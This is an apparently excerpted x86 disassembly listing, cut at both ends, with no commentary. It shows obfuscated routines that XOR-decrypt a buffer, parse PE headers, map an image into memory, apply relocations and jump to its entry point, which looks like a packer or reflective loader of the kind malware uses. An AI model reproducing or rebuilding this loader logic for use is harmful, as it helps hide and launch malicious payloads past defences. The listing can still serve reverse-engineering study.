  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
